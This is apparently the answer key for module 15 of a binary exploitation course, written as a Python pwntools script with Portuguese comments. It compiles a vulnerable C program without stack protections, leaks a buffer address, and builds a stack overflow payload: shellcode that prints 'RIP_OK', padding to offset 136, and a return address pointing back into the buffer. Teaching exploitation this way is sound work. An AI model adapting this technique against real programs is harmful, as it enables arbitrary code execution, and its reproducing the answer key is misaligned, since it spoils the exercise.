from pwn import asm, p64, context
import subprocess, re

# Gabarito do modulo 15. Offset = 136; retorno aponta para o buffer.
context.arch = "amd64"
context.log_level = "error"

subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

shellcode = asm('''
    mov eax, 1
    mov edi, 1
    lea rsi, [rip + message]
    mov edx, 7
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "RIP_OK\\n"
''')

payload = shellcode + b"\x90" * (136 - len(shellcode)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
